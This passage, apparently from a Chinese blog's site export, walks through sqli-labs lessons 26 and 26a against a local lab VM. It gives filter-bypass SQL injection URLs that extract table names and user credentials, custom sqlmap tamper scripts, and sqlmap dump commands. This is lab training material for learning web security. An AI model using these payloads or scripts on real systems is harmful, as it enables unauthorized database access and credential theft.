title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/004.png\" alt=\"004\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;users&#39;)),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/005.png\" alt=\"005\"></p>\n<h3 id=\"获取字段值\"><a href=\"#获取字段值\" class=\"headerlink\" title=\"获取字段值\"></a>获取字段值</h3><p>原谅我数据库学的不好,暂时只想到了按id找。</p>\n<p><code>http://192.168.75.132/sql/Less-26/?id=1&#39;%26%26extractvalue(null,concat(0x7e,(select(concat(username,&#39;~&#39;,passwoorrd))from(security.users)where(id=1)),0x7e))%7c%7c&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26/006.png\" alt=\"006\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>sqlmap跑的话要切换php-5.2.17的版本</p>\n<h3 id=\"修改脚本\"><a href=\"#修改脚本\" class=\"headerlink\" title=\"修改脚本\"></a>修改脚本</h3><p>space2plus.py：空格替换为加号</p>\n<p>在sqlmap的tamper目录下新建space0A.py文件,把space2plus.py脚本中内容复制过来,+改成<code>%A0</code>。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.LOW</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dependencies</span><span class=\"params\">()</span>:</span></span><br><span class=\"line\">    <span class=\"keyword\">pass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    Replaces space character (' ') with plus ('%A0')</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    Notes:</span></span><br><span class=\"line\"><span class=\"string\">        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards</span></span><br><span class=\"line\"><span class=\"string\">        * This tamper script works against all databases</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('SELECT id FROM users')</span></span><br><span class=\"line\"><span class=\"string\">    'SELECT%A0id%A0FROM%A0users'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = <span class=\"string\">\"\"</span></span><br><span class=\"line\">        quote, doublequote, firstspace = <span class=\"literal\">False</span>, <span class=\"literal\">False</span>, <span class=\"literal\">False</span></span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> xrange(len(payload)):</span><br><span class=\"line\">            <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> firstspace:</span><br><span class=\"line\">                <span class=\"keyword\">if</span> payload[i].isspace():</span><br><span class=\"line\">                    firstspace = <span class=\"literal\">True</span></span><br><span class=\"line\">                    retVal += <span class=\"string\">\"%A0\"</span></span><br><span class=\"line\">                    <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\\''</span>:</span><br><span class=\"line\">                quote = <span class=\"keyword\">not</span> quote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">'\"'</span>:</span><br><span class=\"line\">                doublequote = <span class=\"keyword\">not</span> doublequote</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">elif</span> payload[i] == <span class=\"string\">\" \"</span> <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> doublequote <span class=\"keyword\">and</span> <span class=\"keyword\">not</span> quote:</span><br><span class=\"line\">                retVal += <span class=\"string\">\"%A0\"</span></span><br><span class=\"line\">                <span class=\"keyword\">continue</span></span><br><span class=\"line\"></span><br><span class=\"line\">            retVal += payload[i]</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"运行\"><a href=\"#运行\" class=\"headerlink\" title=\"运行\"></a>运行</h3><p>结合上次双写绕过and和or的andor.py脚本跑一下。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;space0A.py,andor.py&quot; --fresh-queries --flush-session</code></p>\n<figure class=\"highlight ada\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">--dbsm msql:指定后端数据库为mysql</span></span><br><span class=\"line\"><span class=\"comment\">--technique E:指定注入方式为报错注入</span></span><br><span class=\"line\"><span class=\"comment\">--threads 10:指定并发线程数为10</span></span><br><span class=\"line\"><span class=\"comment\">--tamper space0A.py,andor.py</span></span><br><span class=\"line\">\tandor.py:payload中的<span class=\"keyword\">and</span>用anandd <span class=\"keyword\">or</span>用oorr替代</span><br><span class=\"line\">\tspace0A.py:空格用%A0替代</span><br><span class=\"line\"><span class=\"comment\">--fresh-queries:发起新请求 </span></span><br><span class=\"line\"><span class=\"comment\">--flush-session：刷新session</span></span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/img/sql/Lesson-26/007.png\" alt=\"007\"></p>\n<p><img src=\"/img/sql/Lesson-26/008.png\" alt=\"008\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.133/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;andor.py,space0A.py&quot; -D security --tables  --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-26/008_1.png\" alt=\"008_1\"></p>\n<p><img src=\"/img/sql/Lesson-26/008_2.png\" alt=\"008_2\"></p>\n<p>跑字段的时候出现了问题,拿不到数据。原来SQLMAP的payload中使用了<code>count(*)</code>包括了<code>*</code>，但是<code>*</code>被过滤了。自然得不出结果。</p>\n<p><img src=\"/img/sql/Lesson-26/008_3.png\" alt=\"008_3\"></p>\n<p>通过查询资料可以发现<code>count(*)</code>和<code>count(常量)</code>是等价的,添加一个把<code>count(*)</code>替换成<code>count(1)</code>的脚本,命名为<code>count.py</code></p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/env python</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)</span></span><br><span class=\"line\"><span class=\"string\">See the file 'LICENSE' for copying permission</span></span><br><span class=\"line\"><span class=\"string\">\"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">from</span> lib.core.enums <span class=\"keyword\">import</span> PRIORITY</span><br><span class=\"line\"></span><br><span class=\"line\">__priority__ = PRIORITY.NORMAL</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">tamper</span><span class=\"params\">(payload, **kwargs)</span>:</span></span><br><span class=\"line\">    <span class=\"string\">\"\"\"</span></span><br><span class=\"line\"><span class=\"string\">    &gt;&gt;&gt; tamper('count(*)')</span></span><br><span class=\"line\"><span class=\"string\">    'count(1)'</span></span><br><span class=\"line\"><span class=\"string\">    \"\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\">    retVal = payload</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span> payload:</span><br><span class=\"line\">        retVal = re.sub(<span class=\"string\">r\"(?i)count\\(\\*\\)\"</span>, <span class=\"string\">r\"count(1)\"</span>, payload)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">return</span> retVal</span><br></pre></td></tr></table></figure>\n\n<p>我这里重启了虚拟机ip地址变了,不过不影响实验结果。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.133/sql/Less-26/?id=1&quot; --threads 10 --technique E --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; -D security -T users  --columns --dump --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-26/009.png\" alt=\"009\"></p>\n<p><img src=\"/img/sql/Lesson-26/010.png\" alt=\"010\"></p>\n"},{"title":"sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号","date":"2018-10-06T04:48:17.000Z","_content":"\n# sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-26a/001.png)\n\n## 手注\n\n```\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\treturn $id;\n}\n```\n\n和Lesson-26一样过滤了or,and,/,*,#,空格,\\。过滤方式没有变化。但是这里不能利用报错注入了。\n\n### 判断类型\n\n`http://192.168.75.132/sql/Less-26a/?id=2')%26%26('1`\n\n使用了`（''）`进行闭合。\n\n![002](/img/sql/Lesson-26a/002.png)\n\n### 获取列数\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select%A01,2,3%7c%7c('1`\n\n![003](/img/sql/Lesson-26a/003.png)\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select%A01,(database()),3%7c%7c('1`\n\n![004](/img/sql/Lesson-26a/004.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),3%7c%7c('1`\n\n![005](/img/sql/Lesson-26a/005.png)\n\n### 获取列名\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),3%7c%7c('1`\n\n![006](/img/sql/Lesson-26a/006.png)\n\n### 获取字段\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3%7c%7c('1`\n\n![007](/img/sql/Lesson-26a/007.png)\n\n## SQLMAP\n\n拿直接的绕过脚本直接用就可以了。\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" --fresh-queries --flush-session`\n\n![008](/img/sql/Lesson-26a/008.png)\n\n![009](/img/sql/Lesson-26a/009.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" --dbs`\n\n![010](/img/sql/Lesson-26a/010.png)\n\n![011](/img/sql/Lesson-26a/011.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" -D security --tables`\n\n![012](/img/sql/Lesson-26a/012.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" -D security -T users --columns --dump`\n\n![013](/img/sql/Lesson-26a/013.png)","source":"_posts/sqli-labs-lession-26a-GET基于错误-你的空格和注释归我所有-字符型-括号.md","raw":"---\ntitle: sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号\ndate: 2018-10-06 12:48:17\ntags: [sqli-labs]\ncategories: sql注入\n---\n\n# sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号\n\n---\n\n## 登录界面\n\n![001](/img/sql/Lesson-26a/001.png)\n\n## 手注\n\n```\nfunction blacklist($id)\n{\n\t$id= preg_replace('/or/i',\"\", $id);\t\t\t//strip out OR (non case sensitive)\n\t$id= preg_replace('/and/i',\"\", $id);\t\t//Strip out AND (non case sensitive)\n\t$id= preg_replace('/[\\/\\*]/',\"\", $id);\t\t//strip out /*\n\t$id= preg_replace('/[--]/',\"\", $id);\t\t//Strip out --\n\t$id= preg_replace('/[#]/',\"\", $id);\t\t\t//Strip out #\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\s]/',\"\", $id);\t\t//Strip out spaces\n\t$id= preg_replace('/[\\/\\\\\\\\]/',\"\", $id);\t\t//Strip out slashes\n\treturn $id;\n}\n```\n\n和Lesson-26一样过滤了or,and,/,*,#,空格,\\。过滤方式没有变化。但是这里不能利用报错注入了。\n\n### 判断类型\n\n`http://192.168.75.132/sql/Less-26a/?id=2')%26%26('1`\n\n使用了`（''）`进行闭合。\n\n![002](/img/sql/Lesson-26a/002.png)\n\n### 获取列数\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select%A01,2,3%7c%7c('1`\n\n![003](/img/sql/Lesson-26a/003.png)\n\n### 获取数据库名\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select%A01,(database()),3%7c%7c('1`\n\n![004](/img/sql/Lesson-26a/004.png)\n\n### 获取表名\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema='security')),3%7c%7c('1`\n\n![005](/img/sql/Lesson-26a/005.png)\n\n### 获取列名\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name='users')),3%7c%7c('1`\n\n![006](/img/sql/Lesson-26a/006.png)\n\n### 获取字段\n\n`http://192.168.75.132/sql/Less-26a/?id=1'%26%261=2)union%A0select(1),(select(group_concat(id,'~',username,'~',passwoorrd))from(security.users)),3%7c%7c('1`\n\n![007](/img/sql/Lesson-26a/007.png)\n\n## SQLMAP\n\n拿直接的绕过脚本直接用就可以了。\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" --fresh-queries --flush-session`\n\n![008](/img/sql/Lesson-26a/008.png)\n\n![009](/img/sql/Lesson-26a/009.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" --dbs`\n\n![010](/img/sql/Lesson-26a/010.png)\n\n![011](/img/sql/Lesson-26a/011.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" -D security --tables`\n\n![012](/img/sql/Lesson-26a/012.png)\n\n`python sqlmap.py -u \"http://192.168.75.132/sql/Less-26a/?id=1\" --threads 10  --dbms mysql --tamper \"andor.py,space0A.py,count.py\" -D security -T users --columns --dump`\n\n![013](/img/sql/Lesson-26a/013.png)","slug":"sqli-labs-lession-26a-GET基于错误-你的空格和注释归我所有-字符型-括号","published":1,"updated":"2019-06-19T17:23:13.389Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjx3istdg003b4dsbh10gjuov","content":"<h1 id=\"sqli-labs-lession-26a-GET基于错误-你的空格和注释归我所有-字符型-括号\"><a href=\"#sqli-labs-lession-26a-GET基于错误-你的空格和注释归我所有-字符型-括号\" class=\"headerlink\" title=\"sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号\"></a>sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-26a/001.png\" alt=\"001\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function blacklist(<span class=\"variable\">$id</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//strip</span> out OR (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/and/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out AND (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//strip</span> out /*</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out --</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//</span>Strip out <span class=\"comment\">#</span></span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\s]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out spaces</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\s]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out spaces</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\/\\\\\\\\]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out slashes</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"variable\">$id</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>和Lesson-26一样过滤了or,and,/,*,#,空格,\\。过滤方式没有变化。但是这里不能利用报错注入了。</p>\n<h3 id=\"判断类型\"><a href=\"#判断类型\" class=\"headerlink\" title=\"判断类型\"></a>判断类型</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=2&#39;)%26%26(&#39;1</code></p>\n<p>使用了<code>（&#39;&#39;）</code>进行闭合。</p>\n<p><img src=\"/img/sql/Lesson-26a/002.png\" alt=\"002\"></p>\n<h3 id=\"获取列数\"><a href=\"#获取列数\" class=\"headerlink\" title=\"获取列数\"></a>获取列数</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select%A01,2,3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/003.png\" alt=\"003\"></p>\n<h3 id=\"获取数据库名\"><a href=\"#获取数据库名\" class=\"headerlink\" title=\"获取数据库名\"></a>获取数据库名</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select%A01,(database()),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/004.png\" alt=\"004\"></p>\n<h3 id=\"获取表名\"><a href=\"#获取表名\" class=\"headerlink\" title=\"获取表名\"></a>获取表名</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select(1),(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema=&#39;security&#39;)),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/005.png\" alt=\"005\"></p>\n<h3 id=\"获取列名\"><a href=\"#获取列名\" class=\"headerlink\" title=\"获取列名\"></a>获取列名</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select(1),(select(group_concat(column_name))from(infoorrmation_schema.columns)where(table_name=&#39;users&#39;)),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/006.png\" alt=\"006\"></p>\n<h3 id=\"获取字段\"><a href=\"#获取字段\" class=\"headerlink\" title=\"获取字段\"></a>获取字段</h3><p><code>http://192.168.75.132/sql/Less-26a/?id=1&#39;%26%261=2)union%A0select(1),(select(group_concat(id,&#39;~&#39;,username,&#39;~&#39;,passwoorrd))from(security.users)),3%7c%7c(&#39;1</code></p>\n<p><img src=\"/img/sql/Lesson-26a/007.png\" alt=\"007\"></p>\n<h2 id=\"SQLMAP\"><a href=\"#SQLMAP\" class=\"headerlink\" title=\"SQLMAP\"></a>SQLMAP</h2><p>拿直接的绕过脚本直接用就可以了。</p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; --fresh-queries --flush-session</code></p>\n<p><img src=\"/img/sql/Lesson-26a/008.png\" alt=\"008\"></p>\n<p><img src=\"/img/sql/Lesson-26a/009.png\" alt=\"009\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; --dbs</code></p>\n<p><img src=\"/img/sql/Lesson-26a/010.png\" alt=\"010\"></p>\n<p><img src=\"/img/sql/Lesson-26a/011.png\" alt=\"011\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; -D security --tables</code></p>\n<p><img src=\"/img/sql/Lesson-26a/012.png\" alt=\"012\"></p>\n<p><code>python sqlmap.py -u &quot;http://192.168.75.132/sql/Less-26a/?id=1&quot; --threads 10  --dbms mysql --tamper &quot;andor.py,space0A.py,count.py&quot; -D security -T users --columns --dump</code></p>\n<p><img src=\"/img/sql/Lesson-26a/013.png\" alt=\"013\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"sqli-labs-lession-26a-GET基于错误-你的空格和注释归我所有-字符型-括号\"><a href=\"#sqli-labs-lession-26a-GET基于错误-你的空格和注释归我所有-字符型-括号\" class=\"headerlink\" title=\"sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号\"></a>sqli-labs lession-26a GET基于错误-你的空格和注释归我所有-字符型-括号</h1><hr>\n<h2 id=\"登录界面\"><a href=\"#登录界面\" class=\"headerlink\" title=\"登录界面\"></a>登录界面</h2><p><img src=\"/img/sql/Lesson-26a/001.png\" alt=\"001\"></p>\n<h2 id=\"手注\"><a href=\"#手注\" class=\"headerlink\" title=\"手注\"></a>手注</h2><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function blacklist(<span class=\"variable\">$id</span>)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/or/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//strip</span> out OR (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/and/i'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out AND (non <span class=\"keyword\">case</span> sensitive)</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\/\\*]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//strip</span> out /*</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[--]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out --</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[#]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t\t<span class=\"regexp\">//</span>Strip out <span class=\"comment\">#</span></span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\s]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out spaces</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span class=\"string\">'/[\\s]/'</span>,<span class=\"string\">\"\"</span>, <span class=\"variable\">$id</span>);\t\t<span class=\"regexp\">//</span>Strip out spaces</span><br><span class=\"line\">\t<span class=\"variable\">$id</span>= preg_replace(<span 